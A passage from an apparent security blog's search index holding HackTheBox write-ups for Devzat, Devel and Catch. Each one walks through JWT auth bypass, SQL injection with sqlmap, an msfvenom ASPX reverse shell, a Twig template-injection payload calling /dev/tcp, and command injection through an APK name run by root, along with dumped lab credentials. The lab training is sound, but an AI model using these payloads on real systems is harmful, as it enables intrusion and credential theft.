Reading about influxdb, the default port seems to be 8086.patrick@devzat:/home$ ss -tulnpNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:5000 0.0.0.0:* users:((&quot;petshop&quot;,pid=947,fd=3)) tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:8086 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:8443 0.0.0.0:* tcp LISTEN 0 511 *:80 *:* tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 4096 *:8000 *:* users:((&quot;devchat&quot;,pid=948,fd=7)) As we can see port 8086 is indeed in use. Searching for vulnerabilities in influxdb returns an Authentication bypassWe can create a valid jwt on https://jwt.io with an empty secret. We can then enumerate the database and dump the user table:patrick@devzat:/home$ curl -G $url --data-urlencode &quot;db=devzat&quot; --data-urlencode &quot;q=SELECT * FROM \\&quot;user\\&quot;&quot; -H &quot;Authorization: Bearer $token&quot;{ &quot;results&quot;: [ { &quot;statement_id&quot;: 0, &quot;series&quot;: [ { &quot;name&quot;: &quot;user&quot;, &quot;columns&quot;: [ &quot;time&quot;, &quot;enabled&quot;, &quot;password&quot;, &quot;username&quot; ], &quot;values&quot;: [ [ &quot;2021-06-22T20:04:16.313965493Z&quot;, false, &quot;WillyWonka2021&quot;, &quot;wilhelm&quot; ], [ &quot;2021-06-22T20:04:16.320782034Z&quot;, true, &quot;woBeeYareedahc7Oogeephies7Aiseci&quot;, &quot;catherine&quot; ], [ &quot;2021-06-22T20:04:16.996682002Z&quot;, true, &quot;RoyalQueenBee$&quot;, &quot;charles&quot; ] ] } ] } ]}patrick@devzat:/home$ We now have the credentials for the catherine user: catherine:woBeeYareedahc7Oogeephies7Aiseci.Privilege escalationAfter switching to the catherine user we should start trying to escalate our privileges. We once again log in to the chat service on port 8000.catherine@devzat:~$ ssh -l catherine -p 8000 localhostThe authenticity of host &#39;[localhost]:8000 ([127.0.0.1]:8000)&#39; can&#39;t be established.RSA key fingerprint is SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;[localhost]:8000&#39; (RSA) to the list of known hosts.patrick: Hey Catherine, glad you came.catherine: Hey bud, what are you up to?patrick: Remember the cool new feature we talked about the other day?catherine: Surepatrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.catherine: Kinda busy right now 👔patrick: That&#39;s perfectly fine 👍 You&#39;ll need a password I gave you last time.catherine: kpatrick: I left the source for your review in backups.catherine: Fine. As soon as the boss let me off the leash I will check it out.patrick: Cool. I am very curious what you think of it. See ya!devbot: patrick has left the chatWelcome to the chat. There are no more usersdevbot: catherine has joined the chatcatherine: As we can see, there is a local dev instance of the chat service on port 8443. We can also see that we should have access to source code for the instance in our backups. Let’s take a look at the /var/backups folder, which contains a zip archive with the source code. Looking at the commands.go file, we see the following code:func fileCommand(u *user, args []string) { if len(args) &amp;lt; 1 { u.system(&quot;Please provide file to print and the password&quot;) return } if len(args) &amp;lt; 2 { u.system(&quot;You need to provide the correct password to use this function&quot;) return } path := args[0] pass := args[1] // Check my secure password if pass != &quot;CeilingCatStillAThingIn2021?&quot; { u.system(&quot;You did provide the wrong password&quot;) return } // Get CWD cwd, err := os.Getwd() if err != nil { u.system(err.Error()) } // Construct path to print printPath := filepath.Join(cwd, path) // Check if file exists if _, err := os.Stat(printPath); err == nil { // exists, print file, err := os.Open(printPath) if err != nil { u.system(fmt.Sprintf(&quot;Something went wrong opening the file: %+v&quot;, err.Error())) return } defer file.Close() scanner := bufio.NewScanner(file) for scanner.Scan() { u.system(scanner.Text()) } if err := scanner.Err(); err != nil { u.system(fmt.Sprintf(&quot;Something went wrong printing the file: %+v&quot;, err.Error())) } return } else if os.IsNotExist(err) { // does not exist, print error u.system(fmt.Sprintf(&quot;The requested file @ %+v does not exist!&quot;, printPath)) return } // bokred? u.system(&quot;Something went badly wrong.&quot;)}It seemingly just prints whatever file we want into the chat. Let’s take a look:devbot: catherine has joined the chatcatherine: /file[SYSTEM] Please provide file to print and the passwordcatherine: /file /root/root.txt CeilingCatStillAThingIn2021?[SYSTEM] The requested file @ /root/devzat/root/root.txt does not exist!catherine: /file ../../../../../root/root.txt CeilingCatStillAThingIn2021?[SYSTEM] 0ad7041bda0cbe6977dd05c16e25a324catherine: We have the contents of root.txt. Obviously we could also have printed the ssh key of the root user, however this will do. Rooted!" }, { "title": "Devel writeup", "url": "/posts/Devel/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, windows, metasploit", "date": "2022-06-21 16:00:00 +0200", "snippet": "SummaryThis box focuses on exploiting a Windows machine hosting an IIS service as well as an ftp service which gives write access to the IIS directory. Metasploit can then be used to gain a foothold and also root the box.Foothold &amp;amp; privilege escalationLet’s start out by doing a port scan with nmap:Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 11:52 EDTNmap scan report for 10.129.237.156Host is up (0.027s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 03-18-17 02:06AM &amp;lt;DIR&amp;gt; aspnet_client| 03-17-17 05:37PM 689 iisstart.htm|_03-17-17 05:37PM 184946 welcome.png| ftp-syst: |_ SYST: Windows_NT80/tcp open http Microsoft IIS httpd 7.5| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7.5|_http-title: IIS7Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsAnonymous ftp login is allowed. Lets try that.┌──(bitis㉿workstation)-[~/htb/Machines/Devel]└─$ ftp 10.129.133.162Connected to 10.129.133.162.220 Microsoft FTP ServiceName (10.129.133.162:bitis): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password: 230 User logged in.Remote system type is Windows_NT.ftp&amp;gt; dir229 Entering Extended Passive Mode (|||49157|)125 Data connection already open; Transfer starting.03-18-17 02:06AM &amp;lt;DIR&amp;gt; aspnet_client03-17-17 05:37PM 689 iisstart.htm03-17-17 05:37PM 184946 welcome.png226 Transfer complete.ftp&amp;gt; Based on the contents of the directory, we have access to the IIS7 directory. This means that if we put a .aspx{: .filepath} file in the directory we would be able to access it via our browser. In that case let’s create a reverse shell via msfvenom:┌──(bitis㉿workstation)-[~/htb/Machines/Devel]└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.182 LPORT=1337 -f aspx &amp;gt; shell.aspx [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of aspx file: 2856 bytes ┌──(bitis㉿workstation)-[~/htb/Machines/Devel]└─$ ftp 10.129.133.162 Connected to 10.129.133.162.220 Microsoft FTP ServiceName (10.129.133.162:bitis): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password: 230 User logged in.Remote system type is Windows_NT.ftp&amp;gt; put ./shell.aspxlocal: ./shell.aspx remote: ./shell.aspx229 Entering Extended Passive Mode (|||49158|)125 Data connection already open; Transfer starting.100% |***********************************************************************************************************************************************************************************************| 2893 13.32 MiB/s --:-- ETA226 Transfer complete.2893 bytes sent in 00:00 (26.60 KiB/s)ftp&amp;gt; exit221 Goodbye.Notice that we uploaded the file via the PUT command.We can then use the handler provided by metasploit:msf6 exploit(multi/handler) &amp;gt; set payload windows/meterpreter/reverse_tcppayload =&amp;gt; windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &amp;gt; set LHOST 10.10.17.182LHOST =&amp;gt; 10.10.17.182msf6 exploit(multi/handler) &amp;gt; set LPORT 1337LPORT =&amp;gt; 1337msf6 exploit(multi/handler) &amp;gt; run[*] Started reverse TCP handler on 10.10.17.182:1337 [*] Sending stage (175686 bytes) to 10.129.133.162[*] Meterpreter session 1 opened (10.10.17.182:1337 -&amp;gt; 10.129.133.162:49170) at 2022-06-21 18:52:28 +0200meterpreter &amp;gt; cd /windows/TEMPmeterpreter &amp;gt; background[*] Backgrounding session 3...msf6 exploit(multi/handler) &amp;gt; use post/multi/recon/local_exploit_suggester msf6 post(multi/recon/local_exploit_suggester) &amp;gt; set SESSION 3SESSION =&amp;gt; 3msf6 post(multi/recon/local_exploit_suggester) &amp;gt; run[*] 10.129.133.162 - Collecting local exploits for x86/windows...[*] 10.129.133.162 - 167 exploit checks are being tried...[+] 10.129.133.162 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.[+] 10.129.133.162 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.[+] 10.129.133.162 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.[+] 10.129.133.162 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.[+] 10.129.133.162 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.[+] 10.129.133.162 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.[+] 10.129.133.162 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.[+] 10.129.133.162 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.[+] 10.129.133.162 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.[+] 10.129.133.162 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.[+] 10.129.133.162 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.[+] 10.129.133.162 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.[+] 10.129.133.162 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.Running down this list of exlpoits we find a working exploit with the name ms10_015_kitrap0dmsf6 exploit(windows/local/ms10_092_schelevator) &amp;gt; use windows/local/ms10_015_kitrap0d[*] Using configured payload windows/meterpreter/reverse_tcpmsf6 exploit(windows/local/ms10_015_kitrap0d) &amp;gt; optionsModule options (exploit/windows/local/ms10_015_kitrap0d): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION 3 yes The session to run this module onPayload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.17.182 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Windows 2K SP4 - Windows 7 (x86)msf6 exploit(windows/local/ms10_015_kitrap0d) &amp;gt; set LHOST 10.10.17.182LHOST =&amp;gt; 10.10.17.182msf6 exploit(windows/local/ms10_015_kitrap0d) &amp;gt; run[*] Started reverse TCP handler on 10.10.17.182:4444 [*] Reflectively injecting payload and triggering the bug...[*] Launching msiexec to host the DLL...[+] Process 3880 launched.[*] Reflectively injecting the DLL into 3880...[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.[*] Sending stage (175686 bytes) to 10.129.133.162[*] Meterpreter session 4 opened (10.10.17.182:4444 -&amp;gt; 10.129.133.162:49177) at 2022-06-21 20:27:10meterpreter &amp;gt; getuidServer username: NT AUTHORITY\\SYSTEMRooted!" }, { "title": "Catch writeup", "url": "/posts/Catch/", "categories": "Writeup, HackTheBox", "tags": "medium-box, apk, android, api, letschat, gitea, cachet", "date": "2022-06-21 16:00:00 +0200", "snippet": "SummaryThis box was a very interesting box centered around a little .apk forensics as well as building valid and signed apks. We used api tokens found in the decompiled apk to access a let’s chat API, which gave us credentials to the Cachet service. This service was vulnerable to multiple CVE’s, however one could be used to leak credentials which was then used to sign into the box via ssh. Once this was done a cronjob was discovered which ran vulnerable code as root every 5 minutes or so. Exploiting this code via an apk with a malicious name resulted in code execution, giving us root access.FootholdWe first start out by doing a port scan# Nmap 7.92 scan initiated Thu Apr 14 00:33:28 2022 as: nmap -sC -sV -p- -o nmap/fullScan.txt 10.129.126.105Nmap scan report for 10.129.126.105Host is up (0.072s latency).Not shown: 65530 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Catch Global Systems|_http-server-header: Apache/2.4.41 (Ubuntu)3000/tcp open ppp?---SNIP---5000/tcp open upnp?---SNIP---8000/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Catch Global Systems|_http-server-header: Apache/2.4.29 (Ubuntu)When we browse to the web application hosted on port 80 we are greeted with the website for Catch Global SystemsA quick look around quickly shows that basically no funtionality is implemented on this page, except the download function.Clicking the bright orange button lets us download an apk file name catchv1.0.apkI’ll use apktool to decode the apk. After decoding the apk we can take a look at the strings.xml file. The file can be found at the path catchv1.0/res/values/strings.xml. Below are some interesting strings:&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&amp;lt;resources&amp;gt; --SNIP--- &amp;lt;string name=&quot;app_name&quot;&amp;gt;Catch&amp;lt;/string&amp;gt; &amp;lt;string name=&quot;gitea_token&quot;&amp;gt;b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0&amp;lt;/string&amp;gt; &amp;lt;string name=&quot;lets_chat_token&quot;&amp;gt;NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&amp;lt;/string&amp;gt; &amp;lt;string name=&quot;slack_token&quot;&amp;gt;xoxp-23984754863-2348975623103&amp;lt;/string&amp;gt; ---SNIP---&amp;lt;/resources&amp;gt;As can be seen above, we now have some tokens that we can use to access the Let&#39;s Chat, Gitea and slack services used by the developers of the apk presumably. In fact, the machine hosts a gitea service on port 3000, a Let&#39;s Chat service on port 5000 and a Cachet service on port 8000.Let’s chat provides a REST-like API, more can be found here and the same goes for GiteaMoreover, the Cachet service has had multiple CVE’s disclosed at this time. I couldn’t find any version number anywhere, but i found some promising exploits in this blogpost. All required an authenticated user however, which i did not have. The blogpost however links to other exploits which can achieve this, including an SQL injection vulnerability in older Cachet versions. A POC for CVE-2021-39165 can be found here.The POC is quite limitied sadly, however it is quite simple to use SQLmap to exploit the vulnerability.sqlmap -u &quot;http://catch.htb:8000/api/v1/components?name=1&amp;amp;1%5B0%5D=&amp;amp;1%5B1%5D=a&amp;amp;1%5B2%5D=&amp;amp;1%5B3%5D=or%201=1)*+--+-&quot; --tables --level=5 --risk=3The * is used to show SQLmap where it should inject payloads.Below is relevant output:[19:03:44] [INFO] retrieved: 5[19:03:45] [INFO] retrieved: information_schema[19:03:56] [INFO] retrieved: cachet[19:04:00] [INFO] retrieved: mysql[19:04:03] [INFO] retrieved: performance_schema[19:04:14] [INFO] retrieved: sys[19:07:25] [INFO] fetching number of tables for database &#39;cachet&#39;[19:07:25] [INFO] retrieved: 25---SNIP---[19:09:30] [INFO] retrieved: usersCommand for dumping columns from the users table in the cachet database:sqlmap -u &quot;http://catch.htb:8000/api/v1/components?name=1&amp;amp;1%5B0%5D=&amp;amp;1%5B1%5D=a&amp;amp;1%5B2%5D=&amp;amp;1%5B3%5D=or%201=1)*+--+-&quot; --columns -D cachet -T users --level=5 --risk=3relevant output:+-------------------+------------------+| Column | Type |+-------------------+------------------+| level | tinyint(4) || active | tinyint(1) || api_key | varchar(191) || created_at | timestamp || email | varchar(191) || google_2fa_secret | varchar(191) || id | int(10) unsigned || password | varchar(191) || remember_token | varchar(100) || updated_at | timestamp || username | varchar(191) || welcomed | tinyint(1) |+-------------------+------------------+The interesting columns are username, password and api_key, so let’s dump those values as well.sqlmap -u &quot;http://catch.htb:8000/api/v1/components?name=1&amp;amp;1%5B0%5D=&amp;amp;1%5B1%5D=a&amp;amp;1%5B2%5D=&amp;amp;1%5B3%5D=or%201=1)*+--+-&quot; --dump -D cachet -T users -C &quot;username,password,api_key&quot; --level=5 --risk=3+----------+--------------------------------------------------------------+----------------------+| username | password | api_key |+----------+--------------------------------------------------------------+----------------------+| john | $2y$10$2jcDURPAEbv2EEKto0ANb.jcjgiAwWzkwzZKNT9fUpOziGjJy5r8e | 7GVCqTY5abrox48Nct8j || admin | $2y$10$quY5ttamPWVo54lbyLSWEu00A/tkMlqoFaEKwJSWPVGHpVK2Wj7Om | rMSN8kJN9TPADl2cWv8N |+----------+--------------------------------------------------------------+----------------------+Let’s try to crack these hashes with hashcat. In the meantime we can check out the other services that we got tokens for via the apk.Let’s check out available rooms on Let’s chat:curl -H &quot;Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&quot; http://catch.htb:5000/roomsOutput can be seen below:[ {&quot;id&quot;:&quot;61b86b28d984e2451036eb17&quot;, &quot;slug&quot;:&quot;status&quot;, &quot;name&quot;:&quot;Status&quot;, &quot;description&quot;:&quot;Cachet Updates and Maintenance&quot;, &quot;lastActive&quot;:&quot;2021-12-14T10:34:20.749Z&quot;, &quot;created&quot;:&quot;2021-12-14T10:00:08.384Z&quot;, &quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;, &quot;private&quot;:false, &quot;hasPassword&quot;:false, &quot;participants&quot;:[]}, {&quot;id&quot;:&quot;61b8708efe190b466d476bfb&quot;, &quot;slug&quot;:&quot;android_dev&quot;, &quot;name&quot;:&quot;Android Development&quot;, &quot;description&quot;:&quot;Android App Updates, Issues &amp;amp; More&quot;, &quot;lastActive&quot;:&quot;2021-12-14T10:24:21.145Z&quot;, &quot;created&quot;:&quot;2021-12-14T10:23:10.474Z&quot;, &quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;, &quot;private&quot;:false, &quot;hasPassword&quot;:false, &quot;participants&quot;:[]}, {&quot;id&quot;:&quot;61b86b3fd984e2451036eb18&quot;, &quot;slug&quot;:&quot;employees&quot;, &quot;name&quot;:&quot;Employees&quot;, &quot;description&quot;:&quot;New Joinees, Org updates&quot;, &quot;lastActive&quot;:&quot;2021-12-14T10:18:04.710Z&quot;, &quot;created&quot;:&quot;2021-12-14T10:00:31.043Z&quot;, &quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;, &quot;private&quot;:false, &quot;hasPassword&quot;:false, &quot;participants&quot;:[]}]Lets get the messages from the rooms aswellcurl -H &quot;Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&quot; http://catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages[ {&quot;id&quot;:&quot;61b8732cfe190b466d476c02&quot;, &quot;text&quot;:&quot;ah sure!&quot;, &quot;posted&quot;:&quot;2021-12-14T10:34:20.749Z&quot;, &quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;, &quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;}, {&quot;id&quot;:&quot;61b8731ffe190b466d476c01&quot;, &quot;text&quot;:&quot;You should actually include this task to your list as well as a part of quarterly audit&quot;, &quot;posted&quot;:&quot;2021-12-14T10:34:07.449Z&quot;, &quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;, &quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;}, {&quot;id&quot;:&quot;61b872b9fe190b466d476c00&quot;, &quot;text&quot;:&quot;Also make sure we&#39;ve our systems, applications and databases up-to-date.&quot;, &quot;posted&quot;:&quot;2021-12-14T10:32:25.514Z&quot;, &quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;, &quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;}, {&quot;id&quot;:&quot;61b87282fe190b466d476bff&quot;, &quot;text&quot;:&quot;Excellent! &quot;, &quot;posted&quot;:&quot;2021-12-14T10:31:30.403Z&quot;, &quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;, &quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;}, {&quot;id&quot;:&quot;61b87277fe190b466d476bfe&quot;, &quot;text&quot;:&quot;Why not. We&#39;ve this in our todo list for next quarter&quot;, &quot;posted&quot;:&quot;2021-12-14T10:31:19.094Z&quot;, &quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;, &quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;}, {&quot;id&quot;:&quot;61b87241fe190b466d476bfd&quot;, &quot;text&quot;:&quot;@john is it possible to add SSL to our status domain to make sure everything is secure ? &quot;, &quot;posted&quot;:&quot;2021-12-14T10:30:25.108Z&quot;, &quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;, &quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;}, {&quot;id&quot;:&quot;61b8702dfe190b466d476bfa&quot;, &quot;text&quot;:&quot;Here are the credentials `john : E}V!mywu_69T4C}W`&quot;, &quot;posted&quot;:&quot;2021-12-14T10:21:33.859Z&quot;, &quot;owner&quot;:&quot;61b86f15fe190b466d476bf5&quot;, &quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;}, {&quot;id&quot;:&quot;61b87010fe190b466d476bf9&quot;, &quot;text&quot;:&quot;Sure one sec.&quot;, &quot;posted&quot;:&quot;2021-12-14T10:21:04.635Z&quot;, &quot;owner&quot;:&quot;61b86f15fe190b466d476bf5&quot;, &quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;}, {&quot;id&quot;:&quot;61b86fb1fe190b466d476bf8&quot;, &quot;text&quot;:&quot;Can you create an account for me ? &quot;, &quot;posted&quot;:&quot;2021-12-14T10:19:29.677Z&quot;, &quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;, &quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;}, {&quot;id&quot;:&quot;61b86f4dfe190b466d476bf6&quot;, &quot;text&quot;:&quot;Hey Team! I&#39;ll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. &quot;, &quot;posted&quot;:&quot;2021-12-14T10:17:49.761Z&quot;, &quot;owner&quot;:&quot;61b86f15fe190b466d476bf5&quot;, &quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;} ]Based on these messages, we now have access to the john user on the cachet status page. We will also probably not be able to crack those passwords we retrieved earlier based on the one we can see in this thread.john:E}V!mywu_69T4C}WWe now have both the api key and password for the john user. Let’s check out what we can do with cachet.Under the incident template tab i found Cachet helpfully tells us that we can use the Twig templating language:Based on PayloadAllTheThings, Twig template injections aiming to achieve code execution take the following form:{{[&#39;id&#39;]|filter(&#39;system&#39;)}}We can then create a reverse shell payload:{{[&quot;bash -c &#39;sh -i &amp;gt;&amp;amp; /dev/tcp/10.10.17.182/1337 0&amp;gt;&amp;amp;1&#39;&quot;]|filter(&#39;system&#39;)}}Once we have created the template, we can report a incident via the incidents tab, however for some reason i could not get a reverse shell on the target system, even though the string {{7*7}} evaluated to 49.Instead i returned to the cachet vulnerabilities referred to earlier. Since I have an authenticated user, I can perform an exploit of CVE-2021-39172. Reading about the exploit, it apparently revolves around being able to access the .env file when changing the mail configuration. The .env file can then be altered in a way so as it points to some remote redis server, and when the system tries to communicate with this redis server, code is deserialized resulting in code execution. Another option is to read the documentation for Cachet https://docs.cachethq.io/docs/installing-cachetHere we see what a normal environment will look like:APP_ENV=productionAPP_DEBUG=falseAPP_URL=http://localhostAPP_KEY=SomeRandomStringDB_DRIVER=mysqlDB_HOST=localhostDB_DATABASE=cachetDB_USERNAME=homesteadDB_PASSWORD=secretDB_PORT=null---SNIP---Since we can access the environment of the system I will simply steal the DB credentials. It was a little unreliable, but submitting ${DB_PASSWORD} and ${DB_USERNAME} in the mail from adress field in the form leaked the variables, and we now have the credentials will:s2#4Fg0_%3!Privilege escalationOnce we ssh into Will’s account on the box, it is usually a good idea to make some noise and make a lot of scans (obviuosly a terrible idea in real life). Linpeas doesn’t show up with anything interesting, but pspy does:---SNIP---2022/06/16 16:49:01 CMD: UID=0 PID=511329 | /bin/bash /opt/mdm/verify.sh 2022/06/16 16:49:01 CMD: UID=0 PID=511332 | openssl rand -hex 12 2022/06/16 16:49:01 CMD: UID=0 PID=511333 | mv /opt/mdm/apk_bin/*.apk /root/mdm/apk_bin/716caef605aa7ce857722e6c.apk 2022/06/16 16:49:01 CMD: UID=0 PID=511334 | jarsigner -verify /root/mdm/apk_bin/716caef605aa7ce857722e6c.apk ---SNIP---We can see that root runs a script /opt/mdm/verify.sh pretty often. Let’s take a look.The contents of the script#!/bin/bash#################### Signature Check ####################sig_check() { jarsigner -verify &quot;$1/$2&quot; 2&amp;gt;/dev/null &amp;gt;/dev/null if [[ $? -eq 0 ]]; then echo &#39;[+] Signature Check Passed&#39; else echo &#39;[!] Signature Check Failed. Invalid Certificate.&#39; cleanup exit fi}######################## Compatibility Check ########################comp_check() { apktool d -s &quot;$1/$2&quot; -o $3 2&amp;gt;/dev/null &amp;gt;/dev/null COMPILE_SDK_VER=$(grep -oPm1 &quot;(?&amp;lt;=compileSdkVersion=\\&quot;)[^\\&quot;]+&quot; &quot;$PROCESS_BIN/AndroidManifest.xml&quot;) if [ -z &quot;$COMPILE_SDK_VER&quot; ]; then echo &#39;[!] Failed to find target SDK version.&#39; cleanup exit else if [ $COMPILE_SDK_VER -lt 18 ]; then echo &quot;[!] APK Doesn&#39;t meet the requirements&quot; cleanup exit fi fi}##################### Basic App Checks #####################app_check() { APP_NAME=$(grep -oPm1 &quot;(?&amp;lt;=&amp;lt;string name=\\&quot;app_name\\&quot;&amp;gt;)[^&amp;lt;]+&quot; &quot;$1/res/values/strings.xml&quot;) echo $APP_NAME if [[ $APP_NAME == *&quot;Catch&quot;* ]]; then echo -n $APP_NAME|xargs -I {} sh -c &#39;mkdir {}&#39; mv &quot;$3/$APK_NAME&quot; &quot;$2/$APP_NAME/$4&quot; else echo &quot;[!] App doesn&#39;t belong to Catch Global&quot; cleanup exit fi}############ Cleanup ############cleanup() { rm -rf $PROCESS_BIN;rm -rf &quot;$DROPBOX/*&quot; &quot;$IN_FOLDER/*&quot;;rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh)}#################### MDM CheckerV1.0 ####################DROPBOX=/opt/mdm/apk_binIN_FOLDER=/root/mdm/apk_binOUT_FOLDER=/root/mdm/certified_appsPROCESS_BIN=/root/mdm/process_binfor IN_APK_NAME in $DROPBOX/*.apk;do OUT_APK_NAME=&quot;$(echo ${IN_APK_NAME##*/} | cut -d &#39;.&#39; -f1)_verified.apk&quot; APK_NAME=&quot;$(openssl rand -hex 12).apk&quot; if [[ -L &quot;$IN_APK_NAME&quot; ]]; then exit else mv &quot;$IN_APK_NAME&quot; &quot;$IN_FOLDER/$APK_NAME&quot; fi sig_check $IN_FOLDER $APK_NAME comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAMEdonecleanupFor every .apk in the /opt/mdm/apk_bin folder, the script will run some operations on the apk bound to that name. The interesting functionality is in the app_check() function, especially line 46. The script runs the command sh -c ‘mkdir APP_NAME’, as long as the name contains Catch. This means that if we name our app Catch;Some_command we can inject arbitrary commands into the script which will then be run as root.The APP_NAME variable gets taken from the strings.xml file within the apk. Furthermore, we also need to sign the apk, since the script checks if the apk is signed and exits if not.The easiest way to get the flag is to simply rename the apk we downloaded earlier in the strings.xml file to:Catch; cp /root/root.txt /tmp/root.txt; chmod 777 /tmp/root.txtThis will copy the flag to /tmp and make it readable.I built the apk using apktool:java -jar apktool_2.6.1.jar b catchv1.0And then signed it via uber-apk-signer. Once this was done i moved it into the apk_bin folder and waited with pspy:2022/06/16 17:37:01 CMD: UID=0 PID=528805 | jarsigner -verify /root/mdm/apk_bin/b07b3f441e5934c62058bcd9.apk 2022/06/16 17:37:02 CMD: UID=0 PID=528825 | 2022/06/16 17:37:02 CMD: UID=0 PID=528823 | /bin/bash /usr/bin/apktool d -s /root/mdm/apk_bin/b07b3f441e5934c62058bcd9.apk -o /root/mdm/process_bin 2022/06/16 17:37:02 CMD: UID=0 PID=528826 | 2022/06/16 17:37:02 CMD: UID=0 PID=528827 | expr xd : x-J 2022/06/16 17:37:08 CMD: UID=0 PID=528847 | /lib/systemd/systemd-udevd 2022/06/16 17:37:14 CMD: UID=0 PID=528851 | grep -oPm1 (?&amp;lt;=compileSdkVersion=&quot;)[^&quot;]+ /root/mdm/process_bin/AndroidManifest.xml 2022/06/16 17:37:14 CMD: UID=0 PID=528856 | 2022/06/16 17:37:14 CMD: UID=0 PID=528855 | sh -c mkdir Catch; cp /root/root.txt /tmp/root.txt; chmod 777 /tmp/root.txt 2022/06/16 17:37:14 CMD: UID=0 PID=528854 | xargs -I {} sh -c mkdir {} 2022/06/16 17:37:14 CMD: UID=0 PID=528858 | chmod 777 /tmp/root.txt 2022/06/16 17:37:14 CMD: UID=0 PID=528859 | mv /root/mdm/apk_bin/b07b3f441e5934c62058bcd9.apk /root/mdm/certified_apps/Catch; cp /root/root.txt /tmp/root.txt; chmod 777 /tmp/root.txt/catchv1_verified.apk 2022/06/16 17:37:14 CMD: UID=0 PID=528860 | rm -rf /root/mdm/process_binI could then read the flag in the /tmp directory. Success!" }, { "title": "Cap 